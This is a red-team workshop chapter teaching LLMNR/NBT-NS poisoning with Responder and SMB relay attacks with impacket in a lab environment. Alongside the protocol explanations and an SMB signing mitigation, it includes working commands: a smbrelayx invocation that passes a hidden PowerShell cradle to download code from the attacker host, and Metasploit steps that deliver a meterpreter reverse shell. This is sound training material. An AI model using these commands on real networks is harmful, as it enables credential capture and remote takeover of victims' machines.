---
title: IV. SMB Relays and LLMNR/NBT-NS Poisoning
layout: workshop
---

# Table of Contents

   * [Workshop Overview](http://solstice.sh/workshops/advanced-wireless-attacks/)
   * [I. Target Identification Within A Red Team Environment](http://solstice.sh/workshops/advanced-wireless-attacks/i-target-identification-within-a-red-team-environment/)
   * [II. Attacking and Gaining Entry To WPA2-EAP Wireless Networks](http://solstice.sh/workshops/advanced-wireless-attacks/ii-attacking-and-gaining-entry-to-wpa2-eap-wireless-networks/)
   * [III. Wireless Man-In-The-Middle Attacks](http://solstice.sh/workshops/advanced-wireless-attacks/iii-wireless-man-in-the-middle-attacks/)
   * ***[IV. SMB Relays and LLMNR/NBT-NS Poisoning](http://solstice.sh/workshops/advanced-wireless-attacks/iv-smb-relays-and-llmnr-nbt-ns-poisoning/)***
   * [V. Firewall And NAC Evasion Using Indirect Wireless Pivots](http://solstice.sh/workshops/advanced-wireless-attacks/v-firewall-and-nac-evasion-using-indirect-wireless-pivots/)

---

# Chapter Overview

In this section we will learn two highly effective network attacks that can be used to target Active Directory environments. Although these attacks may seem unrelated to the wireless techniques we’ve been using up until this point, we’ll be combining both of them with Evil Twin attacks in the next section.

# LLMNR And NBT-NS Poisoning Using Responder

Let’s talk about how NetBIOS name resolution works. When a Windows computer attempts to resolve a hostname, it first checks in an internal cache. If the hostname is not in the cache, it then checks its LMHosts file [12].

If both of these name resolution attempts fail, the Windows computer begins to attempt to resolve the hostname by querying other hosts on the network. It first attempts using a DNS lookup using any local nameservers that it is aware of. If the DNS lookup fails, it then broadcasts an LLMNR broadcast request to all IPs on the same subnet. Finally, if the LLMNR request fails, the Windows computer makes a last ditch attempt at resolving the hostname by making a NBT-NS broadcast request to all hosts on the same subnet [12][13].

For the purposes of this tutorial, we can think of LLMNR and NBT-NS as two services that serve the same logical functionality. To understand how these protocols work, we’ll use an example.  Suppose we have two computers with NetBIOS hostnames Alice and Leeroy. Alice wants to request a file from Leeroy over SMB, but doesn’t know Leeroy’s IP address. After attempting to resolve Leeroy’s IP address locally and using DNS, Alice makes a broadcast request using LLMNR or NBT-NS (the effect is the same). Every computer on the same subnet as Alice receives this request, including Leeroy. Leeroy responds to Alice’s request with its IP, while every other computer on the subnet ignores Alice’s request [12][13].

What happens if Alice gets two responses? Simple: the first response is the one that is considered valid. This creates a race condition that can be exploited by an attacker. All the attacker must do is wait for an LLMNR or NBT-NS request, then attempt to send a response before the victim receives a legitimate one. If the attack is successful, the victim sends traffic to the attacker. Given that NetBIOS name resolution is used extensively for things such as remote login and accessing SMB shares, the traffic sent to the attacker often contains password hashes [14].

Let’s perform a simple LLMNR/NBT-NS poisoning attack. To do this, we’ll be using a tool called Responder. Start by booting up your Windows AD Victim and Kali virtual machines. From your Kali virtual machine, open a terminal and run the following command:

	responder -I eth0 –wf

This will tell Responder to listen for LLMNR/NBT-NS broadcast queries. Next, use your Windows AD Victim to attempt to access a share from a nonexistent hostname such as the one shown in the screenshot below. Using a nonexistent hostname forces the Windows machine to broadcast an LLMNR/NBT-NS request.

![evil twin attack](http://solstice.sh/images/workshops/awae/iv/ie-widget.png)

Responder will then issue a response, causing the victim to attempt to authenticate with the Kali machine. The results are shown in the screenshot below.

![evil twin attack](http://solstice.sh/images/workshops/awae/iv/responding.png)

# Lab Exercise: LLMNR/NBT-NS Poisoning

Practice using Responder to perform LLMNR/NBT-NS poisoning attacks. Experiment with the Responder’s different command line options.

# SMB Relay Attacks With impacket

NTLM is a relatively simple authentication protocol that relies on a challenge/response mechanism. When a client attempts to authenticate using NTLM, the server issues it a challenge in the form of a string of characters. The client then encrypts challenge using its password hash and sends it back to the server as an NTLM response. The server then attempts to decrypt this response using the user’s password hash. If the decrypted response is identical the plaintext challenge, then the user is authenticated [15].

![evil twin attack](http://solstice.sh/images/workshops/awae/iv/ntlmz0rz.png)

In an SMB Relay attack, the attacker places him or herself in a position on the network where he or she can view NTLM traffic as it is transmitted across the wire. Man-in-the-middle attacks are often used to facilitate this. The attacker then waits for a client to attempt to authenticate with the target server. When the client begins the authentication process, the attacker relays the authentication attempt to the target. This causes the target server to issue an NTLM challenge back to the attacker, which the attacker relays back to the client. The client receives the NTLM challenge, encrypts it, and sends the NTLM response back to the attacker. The attacker then relays this response back to the target server. The server receives the response, and the attacker becomes authenticated with the target.

![evil twin attack](http://solstice.sh/images/workshops/awae/iv/smbrelayxz0rz.png)

System administrators often use automated scripts to perform maintenance tasks on the network at regularly scheduled intervals. These scripts often use service accounts that have administrative privileges, and use NTLM for remote authentication. This makes them prime candidates for both SMB Relay attacks and the poisoning attacks that we learned about in the last section. Ironically, many types of security related hardware and software authenticate this way as well, including antivirus programs and agentless network access control mechanisms.

This attack can be mitigated using a technique known as SMB signing, in which packets are digitally signed to confirm their authenticity and point of origin [16]. Most modern Windows operating systems are capable of using SMB signing, although only Domain Controllers have it enabled by default [16].

The impacket toolkit contains an excellent script for performing this type of attack. It’s reliable, flexible, and best of all supports attacks against NTLMv2.

Let’s perform a simple SMB Relay attack using impacket’s smbrelayx script. Before we begin, boot up your Kali VM, Windows DC VM, and your Windows AD Victim VM.

On your Windows DC VM, type the following command in your PowerShell prompt to obtain its IP address.

	ipconfig

Do the same on your Windows AD Victim VM to obtain its IP address. Once you have the IP addresses of both the Windows AD Victim and Windows DC VMs, open a terminal on your Kali VM and run ifconfig to obtain your IP address.

	ifconfig

On your Kali VM, change directories into /opt/impacket/examples and use the following command to start the smbrelayx script. In the command below, make sure you change the IP address to the right of the -h flag to the IP address of your Windows AD Victim virtual machine.  Similarly, change the second IP address to the IP address of your Kali virtual machine. Notice how we pass a Powershell command to run on the targeted machine using the -c flag. The Powershell command bypasses the Windows AD Victim VM’s execution policies and launches a reverse shell downloaded from your Kali virtual machine.

	python smbrelayx.py -h 172.16.15.189 -c "powershell -nop -exec bypass -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://172.16.15.186:8080')"

Once the payload has been generated, use the following commands within metasploit to launch a server from which to download the reverse shell. As before, change the IP address shown below to the IP address of your Kali virtual machine.

	msf > use exploit/multi/script/web\_delivery
	msf (web\_delivery) > set payload windows/meterpreter/reverse\_tcp
	msf (web\_delivery) > set TARGET 2
	msf (web\_delivery) > set LHOST 172.16.15.186
	msf (web\_delivery) > set URIPATH /
	msf (web\_delivery) > exploit

The traditional way to perform this attack is to establish a man-in-the-middle with which to intercept an NTLM exchange. However, we can also perform an SMB Relay attack using the LLMNR/NBT-NS poisoning techniques we learned in the last section. To do this, we simply launch responder on our Kali machine as we did before.

	responder -I eth0 -wrf

With responder running, we just need to perform an action on the Windows DC virtual machine that will trigger an NTLM exchange. An easy way to do this is by attempting to access a nonexistent SMB share from the Windows DC machine as shown in the screenshot below.

![evil twin attack](http://solstice.sh/images/workshops/awae/iv/notashare.png)

You should now see three things happen on your Kali VM. First, you’ll see Responder send a poisoned answer to your Windows DC virtual machine for the NetBIOS name of the non-existent server. 

![evil twin attack](http://solstice.sh/images/workshops/awae/iv/poisoned.png)

Next, you’ll see impacket successfully execute an SMB Relay attack against the Windows AD Victim machine.

![evil twin attack](http://solstice.sh/images/workshops/awae/iv/relayed.png)

Finally, you’ll see Metasploit deliver a payload to the Windows AD Victim machine, giving you a shell.

![evil twin attack](http://solstice.sh/images/workshops/awae/iv/meterprederp.png)

# Lab Exercise: SMB Relay Attacks

Practice using impacket to perform SMB Relay attacks against your Windows AD Victim VM and your Windows DC VM. This time, perform the attack using the Empire Powershell framework by following the steps outlined at the following URL:

 - [https://github.com/s0lst1c3/awae/blob/master/lab6/instructions.txt](https://github.com/s0lst1c3/awae/blob/master/lab6/instructions.txt)

You can find the Empire framework, as well as a copy of the instructions referenced above, within your home directory on the Kali VM.

As your practice this attack, you may notice that it is ineffective against the domain controller. This is because domain controllers have a protection called SMB signing enabled by default that makes SMB Relay attacks impossible. 

---

### Next chapter: *[V. Firewall And NAC Evasion Using Indirect Wireless Pivots](http://solstice.sh/workshops/advanced-wireless-attacks/v-firewall-and-nac-evasion-using-indirect-wireless-pivots/)*

---
